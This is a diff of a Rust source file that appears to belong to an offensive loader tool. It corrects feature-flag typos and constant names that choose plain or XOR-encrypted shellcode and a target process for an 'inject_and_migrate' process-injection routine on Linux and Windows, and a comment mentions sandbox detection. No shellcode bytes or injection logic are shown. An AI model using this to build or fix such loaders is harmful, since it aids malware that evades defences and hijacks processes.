@@ -6,14 +6,14 @@ mod rco_process_migration_linux;
 #[cfg(target_os = "linux")]
 use rco_process_migration_linux::inject_and_migrate;
 // Determine which shellcode and target process to use based on features
-#[cfg(all(target_os = "linux", not(features = "xor")))]
+#[cfg(all(target_os = "linux", not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
-#[cfg(all(target_os = "linux", not(features = "xor")))]
+#[cfg(all(target_os = "linux", not(feature = "xor")))]
 const TARGET_PROCESS: &[u8] = rco_config::LINUX_MIGRATION_TARGET.as_bytes();
-#[cfg(all(target_os = "linux", features = "xor"))]
+#[cfg(all(target_os = "linux", feature = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
-#[cfg(all(target_os = "linux", features = "xor"))]
-const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_MIRGATION_TARGET;
+#[cfg(all(target_os = "linux", feature = "xor"))]
+const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_MIGRATION_TARGET;
 
 // Load Windows implementation if the target OS is Windows
 #[cfg(windows)]
@@ -21,14 +21,14 @@ mod rco_process_migration_windows;
 #[cfg(windows)]
 use rco_process_migration_windows::inject_and_migrate;
 // Determine which shellcode and target process to use based on features
-#[cfg(all(windows, not(features = "xor")))]
+#[cfg(all(windows, not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
-#[cfg(all(windows, not(features = "xor")))]
+#[cfg(all(windows, not(feature = "xor")))]
 const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIGRATION_TARGET.as_bytes();
-#[cfg(all(windows, features = "xor"))]
+#[cfg(all(windows, feature = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
-#[cfg(all(windows, features = "xor"))]
-const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIRGATION_TARGET;
+#[cfg(all(windows, feature = "xor"))]
+const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_WINDOWS_MIGRATION_TARGET;
 
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
